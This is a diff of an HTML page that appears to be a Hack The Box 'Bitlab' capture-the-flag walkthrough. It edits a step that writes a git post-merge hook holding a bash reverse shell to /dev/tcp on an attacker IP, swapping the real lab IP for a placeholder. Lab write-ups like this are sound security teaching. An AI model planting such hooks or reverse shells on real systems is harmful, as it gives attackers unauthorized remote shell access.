@@ -498,8 +498,7 @@ root@bitlab:~# <span class="nb">cat </span>root.txt
   <li>
 <em>Gitlab</em> doesn’t allow it.</li>
   <li>
-<code class="highlighter-rouge">/var/www/html/profile</code> is owned by <code class="highlighter-rouge">root</code>.
-.</li>
+<code class="highlighter-rouge">/var/www/html/profile</code> is owned by <code class="highlighter-rouge">root</code>.</li>
 </ol>
 
 <p>To combat this we will just recreate the <code class="highlighter-rouge">profile</code> repository so we do have ownership.</p>
@@ -510,7 +509,7 @@ root@bitlab:~# <span class="nb">cat </span>root.txt
 
 <p>We will then create our <code class="highlighter-rouge">payload</code>:</p>
 
-<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">'#!/bin/sh'</span> <span class="o">&gt;</span> .git/hooks/post-merge <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.40/6969 0&gt;&amp;1'</span> <span class="o">&gt;&gt;</span> .git/hooks/post-merge</code></pre></figure>
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s1">'#!/bin/sh'</span> <span class="o">&gt;</span> .git/hooks/post-merge <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/6969 0&gt;&amp;1'</span> <span class="o">&gt;&gt;</span> .git/hooks/post-merge</code></pre></figure>
 
 <p>And make the file executable:</p>
 
